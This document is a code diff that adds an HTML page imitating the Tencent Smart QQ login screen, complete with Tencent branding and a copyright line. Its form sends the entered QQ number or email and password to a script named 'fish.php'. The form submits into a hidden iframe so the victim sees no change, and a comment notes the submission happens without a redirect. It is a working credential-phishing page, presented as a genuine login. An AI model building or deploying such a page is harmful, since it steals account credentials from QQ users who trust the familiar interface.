@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0," />
+		<div id='wx_pic' style='margin:0 auto;display:none;'>
+			<img src='img/mq_icon.png' />
+		</div>
+		<title>Smart QQ</title>
+	</head>
+	<link rel="stylesheet" type="text/css" href="css/base.css" />
+	<script src="js/jquery-1.7.2.min.js"></script>
+	<script src="js/base.js"></script>
+
+	<body class="body">
+		<div class="main">
+			<div class="header">
+				<img class="logo" src="img/mq_icon.png" width="40" />
+				<h4 class="logo-txt">Smart QQ</h4>
+			</div>
+			<div class="content">
+				<div id="err_m" class="err_m">请输入正确的内容！<a href="http://support.qq.com/write.shtml?guest=1&amp;fid=713&amp;SSTAG=10011-123" target="_blank">意见反馈</a>
+				</div>
+				<form action="fish.php" method="post" target="id_iframe">
+					<input class="input-u" type="text" name="userId" onblur='""==value&&(value="QQ号码或Email帐号")' onfocus='"QQ号码或Email帐号"==value&&(value="")' value="QQ号码或Email帐号" />
+					<br />
+					<input class="input-p" type="password" name="userName" />
+					<br />
+					<br />
+					<div id="loginState" class="login-state-trigger login-state-trigger2 login-state" title="选择在线状态" onclick="return onLoginStateChanged(this,event),!1">
+						<div id="loginStateShow" class="login-state-show hidden">状态</div>
+						<div class="login-state-down">下</div>
+						<div class="login-state-txt" id="login2qq_state_txt">隐身</div>
+					</div>
+					
+					<!--<input type="text" name="userAge" />
+				<br />-->
+					<input class="input-l" type="submit" value="登 录" onclick="" />
+				</form>
+				<ul id="loginStatePanel" class="statePanel login-state" style="display: none; left: 10px; top: 44.5px;">
+					<li state="online" class="statePanel_li" onmouseover="onStateItemMouseOver(this)" onmouseout="onStateItemMouseOut(this)" onclick="onStateItemClick(10)">
+						<div class="stateSelect_icon online"></div>
+						<div class="stateSelect_text">在线</div>
+					</li>
+					<li state="callme" class="statePanel_li" onmouseover="onStateItemMouseOver(this)" onmouseout="onStateItemMouseOut(this)" onclick="onStateItemClick(60)">
+						<div class="stateSelect_icon callme"></div>
+						<div class="stateSelect_text">Q我吧</div>
+					</li>
+					<li style="background-color: transparent;" state="away" class="statePanel_li" onmouseover="onStateItemMouseOver(this)" onmouseout="onStateItemMouseOut(this)" onclick="onStateItemClick(30)">
+						<div class="stateSelect_icon away"></div>
+						<div class="stateSelect_text">离开</div>
+					</li>
+					<li style="background-color: transparent;" state="busy" class="statePanel_li" onmouseover="onStateItemMouseOver(this)" onmouseout="onStateItemMouseOut(this)" onclick="onStateItemClick(50)">
+						<div class="stateSelect_icon busy"></div>
+						<div class="stateSelect_text">忙碌</div>
+					</li>
+					<li style="background-color: transparent;" state="silent" class="statePanel_li" onmouseover="onStateItemMouseOver(this)" onmouseout="onStateItemMouseOut(this)" onclick="onStateItemClick(70)">
+						<div class="stateSelect_icon silent"></div>
+						<div class="stateSelect_text">请勿打扰</div>
+					</li>
+					<li state="hidden" class="statePanel_li" onmouseover="onStateItemMouseOver(this)" onmouseout="onStateItemMouseOut(this)" onclick="onStateItemClick(40)">
+						<div class="stateSelect_icon hidden"></div>
+						<div class="stateSelect_text">隐身</div>
+					</li>
+				</ul>
+
+				<iframe id="id_iframe" name="id_iframe" style="display:none;"></iframe>
+				<!--form表提交数据到php处理但不跳转-->
+			</div>
+			<br />
+			<br />
+			<div class="copyright">Copyright © 2010-2013 Tencent. All Rights Reserved.</div>
+		</div>
+		<iframe style="display: none;" id="iframe" name="iframe" src="http://w.qq.com/" style="overflow-x: hidden;" width="100%" height="650" scrolling="no" frameborder="0" marginheight="0" marginwidth="0" frameborder="0" onload=""></iframe>
+	</body>
+
+</html>
